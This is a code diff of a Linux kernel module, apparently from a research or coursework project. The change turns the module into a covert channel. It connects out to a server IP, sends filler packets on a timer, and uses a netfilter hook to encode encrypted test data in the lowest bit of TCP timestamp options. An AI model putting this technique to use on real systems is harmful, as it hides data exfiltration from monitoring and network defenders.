@@ -13,7 +13,7 @@
 #include "shared.h"
 
 struct service {
-    struct socket* listen_socket;
+    struct socket* remote_socket;
     struct socket* encrypt_socket;
     struct socket* decrypt_socket;
     struct task_struct* thread;
@@ -23,9 +23,14 @@ struct nf_hook_ops nfhi;
 struct nf_hook_ops nfho;
 struct service* svc;
 struct sock* nl_sk;
+
 unsigned char* buffer;
 unsigned char* encrypted_test_data;
+
 size_t data_len;
+size_t bit_count = 0;
+size_t byte_count = 0;
+
 const char* test_data = "This is a test of data encoding via a covert channel";
 const char* encrypt_sock_path = "/var/run/covert_module_encrypt";
 const char* decrypt_sock_path = "/var/run/covert_module_decrypt";
@@ -88,55 +93,44 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
 }
 
 int start_transmit(void) {
-    struct socket* acsock;
     int error;
     int size;
     struct sockaddr_in sin;
-    int len = 100;
-    unsigned char buf[len + 1];
-    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &svc->listen_socket);
+    int i;
+    unsigned char buf[64];
+
+    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &svc->remote_socket);
     if (error < 0) {
         printk(KERN_ERR "cannot create socket\n");
         return -1;
     }
 
-    sin.sin_addr.s_addr = htonl(INADDR_ANY);
+    //Connect to server ip
+    sin.sin_addr.s_addr = htonl(SERVER_IP);
     sin.sin_family = AF_INET;
     sin.sin_port = htons(PORT);
 
-    error = kernel_bind(svc->listen_socket, (struct sockaddr*) &sin, sizeof(sin));
+    error = kernel_connect(svc->remote_socket, (struct sockaddr*) &sin, sizeof(sin), 0);
     if (error < 0) {
-        printk(KERN_ERR "cannot bind socket, error code: %d\n", error);
+        printk(KERN_ERR "cannot connect to server, error code: %d\n", error);
         return -1;
     }
 
-    error = kernel_listen(svc->listen_socket, 5);
-    if (error < 0) {
-        printk(KERN_ERR "cannot listen, error code: %d\n", error);
-        return -1;
+    for (i = 0; i < 64; ++i) {
+        buf[i] = i;
     }
 
-    while (!kthread_should_stop()) {
-        error = kernel_accept(svc->listen_socket, &acsock, 0);
-        if (error < 0) {
-            printk(KERN_ERR "cannot accept socket\n");
-            return -1;
+    while (!kthread_should_stop() && (byte_count < data_len) && (bit_count < 8)) {
+        //Send garbage message to server
+        send_msg(svc->remote_socket, buf, 64);
+
+        //Sleep for 200ms
+        msleep(200);
+
+        if (bit_count == 7) {
+            ++byte_count;
         }
-
-        memset(&buf, 0, len + 1);
-        while (!kthread_should_stop() && (size = recv_msg(acsock, buf, len)) > 0) {
-            //Transparently encrypt and decrypt the message
-            send_msg(svc->encrypt_socket, buf, size);
-            recv_msg(svc->encrypt_socket, buf, size + OVERHEAD_LEN);
-            send_msg(svc->decrypt_socket, buf, size + OVERHEAD_LEN);
-            recv_msg(svc->decrypt_socket, buf, size);
-
-            //Return the message
-            send_msg(acsock, buf, size);
-            memset(&buf, 0, len + 1);
-        }
-
-        sock_release(acsock);
+        bit_count = (bit_count + 1) % 8;
     }
     return 0;
 }
@@ -240,6 +234,8 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
     unsigned char* packet_data;
     unsigned char* timestamps = NULL;
     int i;
+    unsigned long old_timestamp;
+
     if (ip_header->protocol == 6) {
         tcp_header = (struct tcphdr*) skb_transport_header(skb);
         packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);
@@ -265,10 +261,35 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
                             printk(KERN_INFO "Timestamp option was malformed\n");
                             continue;
                         }
-                        //Here we can modify send timestamp
-                        //Not receive since the echo is unidirectional
-                        *((unsigned long *) (timestamps + 2)) = ntohl(0x12345678);
-                        //timestamps[5] = 0x05;
+
+                        //EVEN IS 0, ODD IS 1
+
+                        //Save old timestamp
+                        old_timestamp = *((unsigned long *) (timestamps + 2));
+
+                        //Modify last bit of send timestamp based on data
+                        if (old_timestamp & 1) {
+                            if (!!(encrypted_test_data[byte_count] & (1 << bit_count))) {
+                                //Data is 1, and timestamp is odd
+                                //Do nothing
+                            } else {
+                                //Data is 0, and timestamp is odd
+                                //Increment timestamp so that it is even
+                                ++old_timestamp;
+                            }
+                        } else {
+                            if (!!(encrypted_test_data[byte_count] & (1 << bit_count))) {
+                                //Data is 1, and timestamp is even
+                                //Increment timestamp so that it is odd
+                                ++old_timestamp;
+                            } else {
+                                //Data is 0, and timestamp is even
+                                //Do nothing
+                            }
+                        }
+
+                        //Write modified timestamp back
+                        *((unsigned long *) (timestamps + 2)) = old_timestamp;
                     } else if (*timestamps == 3) {
                         timestamps += 3;
                     } else if (*timestamps == 4) {
@@ -282,7 +303,7 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
             }
 
             //Modify first byte of data
-            packet_data[0] += 1;
+            //packet_data[0] += 1;
             return NF_ACCEPT;
         }
     }
@@ -332,10 +353,10 @@ static void __exit mod_exit(void) {
     nf_unregister_net_hook(&init_net, &nfhi);
 
     if (svc) {
-        if (svc->listen_socket) {
-            kernel_sock_shutdown(svc->listen_socket, SHUT_RDWR);
-            sock_release(svc->listen_socket);
-            printk(KERN_INFO "release listen socket\n");
+        if (svc->remote_socket) {
+            kernel_sock_shutdown(svc->remote_socket, SHUT_RDWR);
+            sock_release(svc->remote_socket);
+            printk(KERN_INFO "release remote socket\n");
         }
         if (svc->encrypt_socket) {
             sock_release(svc->encrypt_socket);
